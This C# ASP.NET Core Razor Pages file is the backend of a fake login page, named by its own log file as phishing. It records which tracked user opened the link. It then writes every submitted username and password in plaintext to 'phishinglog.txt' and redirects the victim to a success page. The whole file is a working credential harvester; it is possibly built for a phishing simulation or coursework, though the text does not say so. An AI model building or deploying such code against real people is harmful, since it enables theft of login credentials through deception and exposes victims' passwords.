using System.IO;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;

namespace CS_IP.Pages;

public class LoginModel : PageModel
{
    private readonly ILogger<LoginModel> _logger;
    private readonly string logPath;
    
    [BindProperty]
    public string Username { get; set; } 

    [BindProperty]
    public string Password { get; set; }


    public LoginModel(ILogger<LoginModel> logger, IWebHostEnvironment env)
    {
        _logger = logger;
        var logDirectory = Path.Combine(env.ContentRootPath, "Logs");
        if (!Directory.Exists(logDirectory))
        {
            Directory.CreateDirectory(logDirectory);
        }
        logPath = Path.Combine(logDirectory, "phishinglog.txt");
    }

    public void OnGet(string? user)
    {
        if (!string.IsNullOrWhiteSpace(user))
        {
            var log = $"[VISIT] {DateTime.Now:G} - Gebruiker: {user}";
            _logger.LogInformation(log);
            System.IO.File.AppendAllText(logPath, log + Environment.NewLine);
        }
    }

    public IActionResult OnPost()
    {   
        var log = $"[LOGIN] {DateTime.Now:G} - Inlogpoging: Gebruikersnaam: {Username}, Wachtwoord: {Password}";
        _logger.LogInformation(log);
        System.IO.File.AppendAllText(logPath, log + Environment.NewLine);
        return RedirectToPage("Succes");
    }
}